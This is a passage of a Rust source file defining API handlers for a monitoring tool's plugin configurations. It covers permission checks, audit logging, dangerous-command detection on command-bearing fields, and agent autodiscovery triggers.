use crate::AppState;
use crate::api_error::ApiError;
use crate::auth::permissions::Permission;
use crate::config_test_proxy::ConfigTestProxyError;
use crate::error_response::error_response;
use crate::extract::Validated;
use crate::middleware::permission::{
    CanManageCommands, CanTestPluginConfigs, CanTriggerChecks, CanViewSoftware,
};
use crate::middleware::require_auth::{
    AuthenticatedApiTokenId, AuthenticatedUser, authenticated_user_audit_actor,
};
use crate::queries::plugin_configs as pc_queries;
use crate::tenant_db::TenantDb;
use axum::{
    Extension, Json,
    extract::{Path, Query, State},
    http::StatusCode,
    response::{IntoResponse, Response},
};
use sea_orm::{
    ColumnTrait, EntityTrait, FromQueryResult, JoinType, QueryFilter, QuerySelect, RelationTrait,
};
use std::sync::Arc;
use uptrakit_plugin_infrastructure_registry::{ConfigModel, PluginDescriptor};
use uptrakit_shared_db::entity::{host, plugin_config, prelude::*, service, service_host};
use uptrakit_shared_types::{PluginCapability, PluginTypeId};
use uptrakit_web_api_types::autodiscovery::TriggerDiscoveryResponse;
use uptrakit_web_api_types::plugin_config_test::{
    TestPluginConfigRequest, TestPluginConfigResponse,
};
use uuid::Uuid;

pub use uptrakit_web_api_types::batch_actions::{
    BatchActionFailure, BatchActionRequest, BatchActionResponse, BatchActionSuccess,
};
pub use uptrakit_web_api_types::pagination::{PaginatedResponse, PaginationParams};
pub use uptrakit_web_api_types::plugin_configs::{
    CreatePluginConfigRequest, PluginConfigResponse, PluginTypeInfo, UpdatePluginConfigRequest,
};

fn plugin_field_to_api_field<T>(field: T) -> uptrakit_web_api_types::plugin_configs::FormField
where
    T: serde::Serialize,
{
    let value = serde_json::to_value(field)
        .expect("plugin field schema serialization should succeed at route boundary");
    serde_json::from_value(value)
        .expect("plugin field schema conversion to API DTO should succeed at route boundary")
}

fn descriptor_is_config_model_none(descriptor: &PluginDescriptor) -> bool {
    matches!(descriptor.config_model, ConfigModel::None)
}

fn reject_config_model_none_plugin_type(
    state: &AppState,
    plugin_type_id: &PluginTypeId,
) -> Option<Response> {
    let descriptor = match state.plugin_ops.get(plugin_type_id) {
        Some(d) => d,
        None => {
            return Some(error_response(
                StatusCode::BAD_REQUEST,
                "Unknown plugin type",
            ));
        }
    };

    if descriptor_is_config_model_none(descriptor) {
        return Some(error_response(
            StatusCode::BAD_REQUEST,
            format!(
                "Plugin type '{}' does not support per-instance plugin configs",
                plugin_type_id
            ),
        ));
    }

    None
}

async fn load_active_agent_service_for_host(
    tenant_db: &TenantDb,
    host_id: Uuid,
) -> Result<service::Model, Response> {
    let links = match tenant_db
        .find_via_tenant_join::<service_host::Entity, service::Entity>(
            service_host::Relation::Service.def(),
        )
        .filter(service_host::Column::HostId.eq(host_id))
        .all(tenant_db.db())
        .await
    {
        Ok(l) => l,
        Err(e) => {
            tracing::error!("Failed to query service-host links: {e}");
            return Err(error_response(
                StatusCode::INTERNAL_SERVER_ERROR,
                "Internal server error",
            ));
        }
    };

    let service_ids: Vec<Uuid> = links.into_iter().map(|link| link.service_id).collect();
    if service_ids.is_empty() {
        return Err(error_response(
            StatusCode::BAD_REQUEST,
            "No agent connected to this host",
        ));
    }

    let agents = match Service::find()
        .filter(service::Column::Id.is_in(service_ids))
        .filter(service::Column::TenantId.eq(tenant_db.tenant_id))
        .filter(service::Column::DeactivatedAt.is_null())
        .all(tenant_db.db())
        .await
    {
        Ok(agents) => agents,
        Err(e) => {
            tracing::error!("Failed to load services for host: {e}");
            return Err(error_response(
                StatusCode::INTERNAL_SERVER_ERROR,
                "Internal server error",
            ));
        }
    };

    let agent = agents
        .iter()
        .filter(|svc| svc.status == service::ServiceStatus::Approved)
        .max_by_key(|svc| svc.last_seen_at.unwrap_or(svc.updated_at))
        .cloned()
        .or_else(|| {
            agents
                .iter()
                .max_by_key(|svc| svc.last_seen_at.unwrap_or(svc.updated_at))
                .cloned()
        });

    match agent {
        Some(a) if a.status != service::ServiceStatus::Approved => Err(error_response(
            StatusCode::BAD_REQUEST,
            "Agent is not approved",
        )),
        Some(a) => Ok(a),
        None => Err(error_response(
            StatusCode::BAD_REQUEST,
            "No agent connected to this host",
        )),
    }
}

fn emit_plugin_config_semantic_audit(
    state: &AppState,
    tenant_id: Uuid,
    actor_user: &AuthenticatedUser,
    api_token_id: Option<AuthenticatedApiTokenId>,
    action_type: &'static str,
    target_type: Option<&'static str>,
    target_id: Option<String>,
    target_display: Option<String>,
    outcome: uptrakit_audit_log::AuditOutcome,
    details: serde_json::Value,
) {
    let (actor_type, actor_id) = authenticated_user_audit_actor(actor_user, api_token_id);

    let target_type = target_type.map(std::string::ToString::to_string);
    if let Ok(entry) = uptrakit_audit_log::AuditEntry::builder(action_type)
        .tenant_scope(tenant_id)
        .actor(actor_type, actor_id)
        .target_opt(target_type, target_id, target_display)
        .outcome(outcome)
        .details(details)
        .build()
    {
        state.audit_emitter.emit_best_effort(entry);
    }
}

fn dangerous_pattern_matches_to_json(matches: &[DangerousPatternMatch]) -> serde_json::Value {
    serde_json::Value::Array(
        matches
            .iter()
            .map(|dangerous| {
                serde_json::json!({
                    "field": dangerous.field.clone(),
                    "description": dangerous.description,
                })
            })
            .collect(),
    )
}

#[derive(Default)]
struct CommandRiskSummary {
    command_fields: Vec<&'static str>,
    dangerous_matches: Vec<DangerousPatternMatch>,
}

impl CommandRiskSummary {
    fn from_config(config: &serde_json::Value) -> Self {
        Self {
            command_fields: detect_command_fields(config),
            dangerous_matches: collect_dangerous_patterns(config),
        }
    }

    fn details_fragment(&self) -> serde_json::Value {
        serde_json::json!({
            "contains_command_fields": !self.command_fields.is_empty(),
            "command_fields": self.command_fields,
            "dangerous_command_match_count": self.dangerous_matches.len(),
            "dangerous_matches": dangerous_pattern_matches_to_json(&self.dangerous_matches),
        })
    }
}

/// List all known plugin types with their display names and capabilities.
///
/// Returns static registry metadata — no tenant data is involved. Clients
/// should call this endpoint to populate plugin-type selectors rather than
/// hard-coding plugin type strings.
#[utoipa::path(
    get,
    path = "/api/v1/plugin-types",
    extensions(("x-required-permission" = json!(["view_software", "view_settings", "manage_global_settings"]))),
    responses(
        (status = 200, description = "List of known plugin types", body = Vec<PluginTypeInfo>),
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn list_plugin_types(
    State(state): State<Arc<AppState>>,
    Extension(auth_user): Extension<AuthenticatedUser>,
) -> Response {
    if !auth_user.has_permission(Permission::ViewSoftware)
        && !auth_user.has_permission(Permission::ViewSettings)
        && !auth_user.has_permission(Permission::ManageGlobalSettings)
    {
        return error_response(StatusCode::FORBIDDEN, "Insufficient permissions");
    }

    let types: Vec<PluginTypeInfo> = state
        .plugin_ops
        .known_type_ids()
        .into_iter()
        .map(|id| {
            let capabilities = state.plugin_ops.capabilities(&id);
            let config_form_fields = state
                .plugin_ops
                .config_form_schema(&id)
                .unwrap_or_default()
                .into_iter()
                .map(plugin_field_to_api_field)
                .collect();
            let type_settings_form_fields = state
                .plugin_ops
                .type_settings_form_schema(&id)
                .unwrap_or_default()
                .into_iter()
                .map(plugin_field_to_api_field)
                .collect();
            let type_settings_sample = state.plugin_ops.type_settings_sample(&id);
            let display_name = state.plugin_ops.display_name(&id);
            let plugin_type = id.clone();
            let supports_plugin_configs = state
                .plugin_ops
                .get(&id)
                .map(|d| !descriptor_is_config_model_none(d))
                .unwrap_or(false);
            let sample_config = state
                .plugin_ops
                .get(&id)
                .map(|d| {
                    if descriptor_is_config_model_none(d) {
                        serde_json::json!({})
                    } else {
                        state.plugin_ops.sample_config(&id)
                    }
                })
                .unwrap_or_default();
            PluginTypeInfo {
                display_name,
                plugin_type,
                supports_plugin_configs,
                capabilities,
                sample_config,
                config_form_fields,
                type_settings_form_fields,
                type_settings_sample,
            }
        })
        .collect();
    (StatusCode::OK, Json(types)).into_response()
}

/// Create a new plugin configuration.
///
/// Requires `manage_commands` permission because plugin configs can contain
/// arbitrary shell commands executed on managed hosts.
#[utoipa::path(
    post,
    path = "/api/v1/plugin-configs",
    request_body = CreatePluginConfigRequest,
    extensions(("x-required-permission" = json!("manage_commands"))),
    responses(
        (status = 201, description = "Plugin config created", body = PluginConfigResponse),
        (status = 400, description = "Invalid input"),
        (status = 409, description = "A plugin config with this name already exists")
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn create_plugin_config(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    CanManageCommands(user): CanManageCommands,
    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
    Validated(req): Validated<CreatePluginConfigRequest>,
) -> Result<impl IntoResponse, ApiError> {
    let api_token_id = api_token_id.map(|value| value.0);

    let plugin_type_str = req.plugin_type.to_string();
    let config_name = req.name.clone();
    let enabled = req.enabled;
    let config_risk = CommandRiskSummary::from_config(&req.config);

    // Validate plugin-specific config (matches the update path).
    let plugin_type_id = PluginTypeId::new(&plugin_type_str);
    if let Some(rejection) = reject_config_model_none_plugin_type(&state, &plugin_type_id) {
        return Ok(rejection);
    }
    if let Err(e) = state
        .plugin_ops
        .validate_config(&plugin_type_id, &req.config)
    {
        return Ok(error_response(StatusCode::BAD_REQUEST, e.to_string()));
    }

    // Reject dangerous command patterns when operator policy is enabled.
    if state.reject_dangerous_commands {
        if !config_risk.dangerous_matches.is_empty() {
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
                Some("plugin_config"),
                None,
                Some(config_name.clone()),
                uptrakit_audit_log::AuditOutcome::Denied,
                serde_json::json!({
                    "plugin_type": plugin_type_str.clone(),
                    "config_name": config_name.clone(),
                    "contains_command_fields": !config_risk.command_fields.is_empty(),
                    "reason_code": "dangerous_command_patterns_detected",
                    "dangerous_matches": dangerous_pattern_matches_to_json(&config_risk.dangerous_matches),
                }),
            );
            return Ok(error_response(
                StatusCode::BAD_REQUEST,
                format_dangerous_pattern_rejection(&config_risk.dangerous_matches),
            ));
        }
    }

    let resp = pc_queries::create_plugin_config(state.plugin_ops.as_ref(), &tenant_db, req).await?;
    emit_plugin_config_semantic_audit(
        &state,
        tenant_db.tenant_id,
        &user,
        api_token_id,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
        Some("plugin_config"),
        Some(resp.id.to_string()),
        Some(resp.name.clone()),
        uptrakit_audit_log::AuditOutcome::Success,
        serde_json::json!({
            "plugin_type": plugin_type_str.clone(),
            "config_name": resp.name.clone(),
            "enabled": enabled,
            "contains_command_fields": !config_risk.command_fields.is_empty(),
            "command_fields": config_risk.command_fields.clone(),
            "dangerous_command_match_count": config_risk.dangerous_matches.len(),
            "dangerous_matches": dangerous_pattern_matches_to_json(&config_risk.dangerous_matches),
        }),
    );

    Ok((StatusCode::CREATED, Json(resp)).into_response())
}

/// List all non-deactivated plugin configurations.
#[utoipa::path(
    get,
    path = "/api/v1/plugin-configs",
    params(
        ("page" = Option<u64>, Query, description = "Page number (1-indexed, default 1)"),
        ("per_page" = Option<u64>, Query, description = "Items per page (default 20, max 1000)")
    ),
    extensions(("x-required-permission" = json!("view_software"))),
    responses(
        (status = 200, description = "Paginated list of plugin configs", body = PaginatedResponse<PluginConfigResponse>),
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn list_plugin_configs(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    CanViewSoftware(_user): CanViewSoftware,
    Query(params): Query<PaginationParams>,
) -> Response {
    match pc_queries::list_plugin_configs(state.plugin_ops.as_ref(), &tenant_db, &params).await {
        Ok(resp) => (StatusCode::OK, Json(resp)).into_response(),
        Err(e) => {
            tracing::error!("Failed to list plugin configs: {e}");
            error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error")
        }
    }
}

/// Get a specific plugin configuration.
#[utoipa::path(
    get,
    path = "/api/v1/plugin-configs/{id}",
    params(("id" = Uuid, Path, description = "Plugin config ID")),
    extensions(("x-required-permission" = json!("view_software"))),
    responses(
        (status = 200, description = "Plugin config details", body = PluginConfigResponse),
        (status = 404, description = "Plugin config not found")
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn get_plugin_config(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    Path(config_id): Path<Uuid>,
    CanViewSoftware(_user): CanViewSoftware,
) -> Response {
    match pc_queries::get_plugin_config(state.plugin_ops.as_ref(), &tenant_db, config_id).await {
        Ok(Some(resp)) => (StatusCode::OK, Json(resp)).into_response(),
        Ok(None) => error_response(StatusCode::NOT_FOUND, "Plugin config not found"),
        Err(e) => {
            tracing::error!("Failed to get plugin config: {e}");
            error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error")
        }
    }
}

/// Update a plugin configuration (partial update).
///
/// Requires `manage_commands` permission because plugin configs can contain
/// arbitrary shell commands executed on managed hosts.
#[utoipa::path(
    put,
    path = "/api/v1/plugin-configs/{id}",
    params(("id" = Uuid, Path, description = "Plugin config ID")),
    request_body = UpdatePluginConfigRequest,
    extensions(("x-required-permission" = json!("manage_commands"))),
    responses(
        (status = 200, description = "Plugin config updated", body = PluginConfigResponse),
        (status = 404, description = "Plugin config not found")
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn update_plugin_config(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    Path(config_id): Path<Uuid>,
    CanManageCommands(user): CanManageCommands,
    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
    Json(req): Json<UpdatePluginConfigRequest>,
) -> Result<impl IntoResponse, ApiError> {
    let api_token_id = api_token_id.map(|value| value.0);

    let existing = match PluginConfig::find_by_id(config_id)
        .filter(plugin_config::Column::TenantId.eq(tenant_db.tenant_id))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .one(tenant_db.db())
        .await
    {
        Ok(Some(model)) => model,
        Ok(None) => {
            return Ok(error_response(
                StatusCode::NOT_FOUND,
                "Plugin config not found",
            ));
        }
        Err(e) => {
            tracing::error!("DB error loading plugin config for update: {e}");
            return Ok(error_response(
                StatusCode::INTERNAL_SERVER_ERROR,
                "Internal server error",
            ));
        }
    };
    let existing_plugin_type = PluginTypeId::new(existing.plugin_type);
    if let Some(rejection) = reject_config_model_none_plugin_type(&state, &existing_plugin_type) {
        return Ok(rejection);
    }

    let new_config_risk = req.config.as_ref().map(CommandRiskSummary::from_config);

    // Reject dangerous command patterns when operator policy is enabled.
    if state.reject_dangerous_commands
        && let Some(ref risk) = new_config_risk
    {
        if !risk.dangerous_matches.is_empty() {
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
                Some("plugin_config"),
                Some(config_id.to_string()),
                req.name.clone(),
                uptrakit_audit_log::AuditOutcome::Denied,
                serde_json::json!({
                    "plugin_type": existing_plugin_type.to_string(),
                    "config_name": req.name.clone(),
                    "contains_command_fields": !risk.command_fields.is_empty(),
                    "reason_code": "dangerous_command_patterns_detected",
                    "dangerous_matches": dangerous_pattern_matches_to_json(&risk.dangerous_matches),
                }),
            );
            return Ok(error_response(
                StatusCode::BAD_REQUEST,
                format_dangerous_pattern_rejection(&risk.dangerous_matches),
            ));
        }
    }

    let resp =
        pc_queries::update_plugin_config(state.plugin_ops.as_ref(), &tenant_db, config_id, req)
            .await?;
    emit_plugin_config_semantic_audit(
        &state,
        tenant_db.tenant_id,
        &user,
        api_token_id,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
        Some("plugin_config"),
        Some(config_id.to_string()),
        Some(resp.name.clone()),
        uptrakit_audit_log::AuditOutcome::Success,
        {
            let risk_details = new_config_risk
                .as_ref()
                .map(CommandRiskSummary::details_fragment)
                .unwrap_or_else(|| CommandRiskSummary::default().details_fragment());
            serde_json::json!({
            "plugin_type": resp.plugin_type.to_string(),
            "config_name": resp.name.clone(),
            "enabled": resp.enabled,
            "contains_command_fields": risk_details["contains_command_fields"].clone(),
            "command_fields": risk_details["command_fields"].clone(),
            "dangerous_command_match_count": risk_details["dangerous_command_match_count"].clone(),
            "dangerous_matches": risk_details["dangerous_matches"].clone(),
            })
        },
    );

    Ok((StatusCode::OK, Json(resp)).into_response())
}

/// Soft-delete a plugin configuration.
#[utoipa::path(
    delete,
    path = "/api/v1/plugin-configs/{id}",
    params(("id" = Uuid, Path, description = "Plugin config ID")),
    extensions(("x-required-permission" = json!("manage_commands"))),
    responses(
        (status = 204, description = "Plugin config deleted"),
        (status = 404, description = "Plugin config not found")
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn delete_plugin_config(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    Path(config_id): Path<Uuid>,
    CanManageCommands(user): CanManageCommands,
    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
) -> Response {
    let api_token_id = api_token_id.map(|value| value.0);

    let existing = match PluginConfig::find_by_id(config_id)
        .filter(plugin_config::Column::TenantId.eq(tenant_db.tenant_id))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .one(tenant_db.db())
        .await
    {
        Ok(model) => model,
        Err(e) => {
            tracing::error!("DB error loading plugin config for delete: {e}");
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
                Some("plugin_config"),
                Some(config_id.to_string()),
                None,
                uptrakit_audit_log::AuditOutcome::Failed,
                serde_json::json!({
                    "reason_code": "plugin_config_load_failed",
                }),
            );
            return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
        }
    };

    match pc_queries::delete_plugin_config(&tenant_db, config_id).await {
        Ok(true) => {
            let (target_display, details) = if let Some(existing) = existing {
                let config_risk = CommandRiskSummary::from_config(&existing.config);
                (
                    Some(existing.name.clone()),
                    serde_json::json!({
                        "plugin_type": existing.plugin_type,
                        "config_name": existing.name,
                        "enabled": existing.enabled,
                        "contains_command_fields": !config_risk.command_fields.is_empty(),
                        "command_fields": config_risk.command_fields,
                        "dangerous_command_match_count": config_risk.dangerous_matches.len(),
                        "dangerous_matches": dangerous_pattern_matches_to_json(&config_risk.dangerous_matches),
                    }),
                )
            } else {
                (
                    None,
                    serde_json::json!({
                        "contains_command_fields": false,
                        "command_fields": [],
                        "dangerous_command_match_count": 0,
                        "dangerous_matches": [],
                    }),
                )
            };
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
                Some("plugin_config"),
                Some(config_id.to_string()),
                target_display,
                uptrakit_audit_log::AuditOutcome::Success,
                details,
            );
            StatusCode::NO_CONTENT.into_response()
        }
        Ok(false) => {
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
                Some("plugin_config"),
                Some(config_id.to_string()),
                None,
                uptrakit_audit_log::AuditOutcome::Denied,
                serde_json::json!({
                    "reason_code": "plugin_config_not_found",
                }),
            );
            error_response(StatusCode::NOT_FOUND, "Plugin config not found")
        }
        Err(e) => {
            tracing::error!("Failed to delete plugin config: {e}");
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
                Some("plugin_config"),
                Some(config_id.to_string()),
                existing.as_ref().map(|model| model.name.clone()),
                uptrakit_audit_log::AuditOutcome::Failed,
                serde_json::json!({
                    "reason_code": "plugin_config_delete_failed",
                }),
            );
            error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error")
        }
    }
}

// ── Autodiscovery endpoints ───────────────────────────────────────────────────

/// Trigger autodiscovery for a specific plugin configuration.
///
/// Sends a `DiscoverSoftware` assignment to all connected agents.
/// Returns an error if the plugin type does not support discovery.
#[utoipa::path(
    post,
    path = "/api/v1/plugin-configs/{id}/discover",
    params(("id" = Uuid, Path, description = "Plugin config UUID")),
    extensions(("x-required-permission" = json!("trigger_checks"))),
    responses(
        (status = 200, description = "Discovery triggered", body = TriggerDiscoveryResponse),
        (status = 400, description = "Plugin type does not support discovery"),
        (status = 404, description = "Plugin config not found")
    ),
    tag = "Plugin Configs",
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn discover_plugin_config(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    CanTriggerChecks(_user): CanTriggerChecks,
    Path(config_id): Path<Uuid>,
) -> Response {
    // Load the plugin config and verify it belongs to the tenant.
    let cfg = match PluginConfig::find_by_id(config_id)
        .filter(plugin_config::Column::TenantId.eq(tenant_db.tenant_id))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .one(tenant_db.db())
        .await
    {
        Ok(Some(c)) => c,
        Ok(None) => return error_response(StatusCode::NOT_FOUND, "Plugin config not found"),
        Err(e) => {
            tracing::error!("DB error: {e}");
            return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
        }
    };

    // Validate plugin supports discovery.
    let plugin_type_id = PluginTypeId::new(&cfg.plugin_type);

    if !state
        .plugin_ops
        .discovery_plugins()
        .contains(&plugin_type_id)
    {
        return error_response(
            StatusCode::BAD_REQUEST,
            format!(
                "Plugin type '{}' does not support autodiscovery",
                cfg.plugin_type
            ),
        );
    }

    // Single JOIN query: service_host → service (tenant-scoped) → host
    // This prevents cross-tenant data leaks and eliminates the N+1 pattern.
    #[derive(FromQueryResult)]
    struct AgentHostRow {
        service_id: uuid::Uuid,
        machine_id: String,
    }

    let rows: Vec<AgentHostRow> = match tenant_db
        .find_via_tenant_join::<service_host::Entity, service::Entity>(
            service_host::Relation::Service.def(),
        )
        .join(JoinType::InnerJoin, service_host::Relation::Host.def())
        .select_only()
        .column(service_host::Column::ServiceId)
        .column(host::Column::MachineId)
        .filter(service::Column::DeactivatedAt.is_null())
        .filter(host::Column::TenantId.eq(tenant_db.tenant_id))
        .filter(host::Column::DeactivatedAt.is_null())
        .into_model::<AgentHostRow>()
        .all(tenant_db.db())
        .await
    {
        Ok(r) => r,
        Err(e) => {
            tracing::error!("Failed to query service-host links: {e}");
            return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
        }
    };

    // Group machine_ids by service_id.
    let mut by_service: std::collections::HashMap<uuid::Uuid, Vec<String>> =
        std::collections::HashMap::new();
    for row in rows {
        by_service
            .entry(row.service_id)
            .or_default()
            .push(row.machine_id);
    }

    let agents_notified = by_service.len() as u32;

    // One DiscoverSoftware message per (agent, host) pair.
    for (agent_id, machine_ids) in &by_service {
        for machine_id in machine_ids {
            let msg = uptrakit_internal_wire::ControllerMessage::DiscoverSoftware(
                uptrakit_internal_wire::DiscoverSoftwarePayload {
                    host_machine_id: machine_id.clone(),
                    plugins: vec![uptrakit_internal_wire::DiscoveryPluginAssignment {
                        plugin_config_id: Some(cfg.id),
                        plugin_type: PluginTypeId::new(cfg.plugin_type.clone()),
                        config: cfg.config.clone(),
                    }],
                },
            );
            state
                .notification
                .notification_service
                .send(agent_id, msg)
                .await;
        }
    }

    (
        StatusCode::OK,
        Json(TriggerDiscoveryResponse {
            plugins_queued: agents_notified,
            message: format!(
                "Discovery triggered for plugin config '{}' on {} agent(s)",
                cfg.name, agents_notified
            ),
        }),
    )
        .into_response()
}

// ── Security audit helpers ────────────────────────────────────────────────────

/// Detected dangerous pattern in a command-bearing field.
#[derive(Debug)]
struct DangerousPatternMatch {
    /// Display-friendly field name (e.g. `"version_command"`, `"hooks.pre_update.commands[0]"`).
    field: String,
    /// Short description of the detected pattern.
    description: &'static str,
}

/// Scan all command-bearing fields in a plugin config for dangerous patterns.
///
/// Returns a list of matches. An empty list means no dangerous patterns were found.
fn collect_dangerous_patterns(config: &serde_json::Value) -> Vec<DangerousPatternMatch> {
    let obj = match config.as_object() {
        Some(o) => o,
        None => return Vec::new(),
    };

    let mut results = Vec::new();

    // Check top-level command string fields.
    for &(field_name, display_name) in &[
        ("version_command", "version_command"),
        ("update_command", "update_command"),
        ("post_pull_command", "post_pull_command"),
    ] {
        if let Some(val) = obj.get(field_name).and_then(|v| v.as_str()) {
            let patterns =
                uptrakit_web_api_types::command_validation::detect_dangerous_patterns(val);
            for (_, desc) in patterns {
                results.push(DangerousPatternMatch {
                    field: display_name.to_string(),
                    description: desc,
                });
            }
        }
    }

    // Check structured hook commands.
    if let Some(hooks) = obj.get("hooks").and_then(|v| v.as_object()) {
        for phase in ["pre_update", "post_update"] {
            if let Some(hook) = hooks.get(phase).and_then(|v| v.as_object())
                && let Some(arr) = hook.get("commands").and_then(|v| v.as_array())
            {
                for (i, cmd) in arr.iter().enumerate() {
                    if let Some(cmd_str) = cmd.as_str() {
                        let patterns =
                            uptrakit_web_api_types::command_validation::detect_dangerous_patterns(
                                cmd_str,
                            );
                        for (_, desc) in patterns {
                            results.push(DangerousPatternMatch {
                                field: format!("hooks.{phase}.commands[{i}]"),
                                description: desc,
                            });
                        }
                    }
                }
            }
        }
    }

    results
}

/// Format a rejection error message from a list of dangerous pattern matches.
fn format_dangerous_pattern_rejection(matches: &[DangerousPatternMatch]) -> String {
    use std::fmt::Write;
    let mut msg = String::from(
        "Plugin config contains dangerous command patterns and was rejected by server policy",
    );
    for m in matches {
        write!(msg, "; {}: {}", m.field, m.description).expect("write to String never fails");
    }
    msg
}

/// Known field names that carry executable commands in plugin configs.
const COMMAND_FIELD_NAMES: &[&str] = &[
    "version_command",
    "update_command",
    "post_pull_command",
    "pre_update_commands",
    "post_update_commands",
];

/// Detect command-bearing field names present in a plugin config value.
///
/// Returns a list of field names that carry executable commands (e.g.
/// `version_command`, `update_command`, `post_pull_command`, hook `commands`).
/// Used for security audit logging to highlight configs that grant effective RCE
/// on managed hosts.
fn detect_command_fields(config: &serde_json::Value) -> Vec<&'static str> {
    let obj = match config.as_object() {
        Some(o) => o,
        None => return Vec::new(),
    };

    let mut fields = Vec::new();

    for &name in COMMAND_FIELD_NAMES {
        if let Some(val) = obj.get(name) {
            // Skip null/empty values.
            if !val.is_null() {
                fields.push(name);
            }
        }
    }

    // Structured hooks: hooks.pre_update.commands, hooks.post_update.commands
    if let Some(hooks) = obj.get("hooks").and_then(|v| v.as_object()) {
        for phase in ["pre_update", "post_update"] {
            if let Some(hook) = hooks.get(phase).and_then(|v| v.as_object())
                && let Some(arr) = hook.get("commands").and_then(|v| v.as_array())
                && !arr.is_empty()
            {
                if phase == "pre_update" {
                    fields.push("hooks.pre_update.commands");
                } else {
                    fields.push("hooks.post_update.commands");
                }
            }
        }
    }

    fields
}

/// Perform a batch action on multiple plugin configs.
///
/// Supported actions: `delete`.
/// Returns per-item success/failure results (partial success is possible).
#[utoipa::path(
    post,
    path = "/api/v1/plugin-configs/batch",
    request_body = BatchActionRequest,
    responses(
        (status = 200, description = "Batch action results", body = BatchActionResponse),
        (status = 400, description = "Invalid request"),
        (status = 401, description = "Not authenticated"),
        (status = 403, description = "Not authorized")
    ),
    tag = "Plugin Configs",
    extensions(("x-required-permission" = json!("manage_commands"))),
    security(("bearer_token" = []))
)]
#[tracing::instrument(skip_all)]
pub async fn batch_plugin_configs(
    State(state): State<Arc<AppState>>,
    tenant_db: TenantDb,
    CanManageCommands(user): CanManageCommands,
    api_token_id: Option<Extension<AuthenticatedApiTokenId>>,
    Validated(body): Validated<BatchActionRequest>,
) -> Response {
    let api_token_id = api_token_id.map(|value| value.0);

    let (succeeded_ids, failed) = match body.action.as_str() {
        "delete" => match pc_queries::batch_delete_plugin_configs(&tenant_db, &body.ids).await {
            Ok(r) => r,
            Err(e) => {
                tracing::error!("batch delete failed: {e}");
                emit_plugin_config_semantic_audit(
                    &state,
                    tenant_db.tenant_id,
                    &user,
                    api_token_id,
                    uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
                    None,
                    None,
                    None,
                    uptrakit_audit_log::AuditOutcome::Failed,
                    serde_json::json!({
                        "update_kind": "batch_delete",
                        "reason_code": "batch_delete_failed",
                        "requested_count": body.ids.len(),
                    }),
                );
                return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
            }
        },
        unknown => {
            emit_plugin_config_semantic_audit(
                &state,
                tenant_db.tenant_id,
                &user,
                api_token_id,
                uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
                None,
                None,
                None,
                uptrakit_audit_log::AuditOutcome::ValidationFailed,
                serde_json::json!({
                    "update_kind": "batch_delete",
                    "reason_code": "unknown_action",
                    "action": unknown,
                }),
            );
            return error_response(
                StatusCode::BAD_REQUEST,
                format!("unknown action: {unknown}. Supported: delete"),
            );
        }
    };

    emit_plugin_config_semantic_audit(
        &state,
        tenant_db.tenant_id,
        &user,
        api_token_id,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        None,
        None,
        None,
        if failed.is_empty() {
            uptrakit_audit_log::AuditOutcome::Success
        } else if succeeded_ids.is_empty() {
            uptrakit_audit_log::AuditOutcome::Denied
        } else {
            uptrakit_audit_log::AuditOutcome::Partial
        },
        serde_json::json!({
            "update_kind": "batch_delete",
            "requested_count": body.ids.len(),
            "deleted_count": succeeded_ids.len(),
            "failed_count": failed.len(),
        }),
    );

    let response = BatchActionResponse {
        succeeded: succeeded_ids
            .into_iter()
            .map(|id| BatchActionSuccess { id })
            .collect(),
        failed: failed
            .into_iter()
            .map(|(id, error)| BatchActionFailure { id, error })
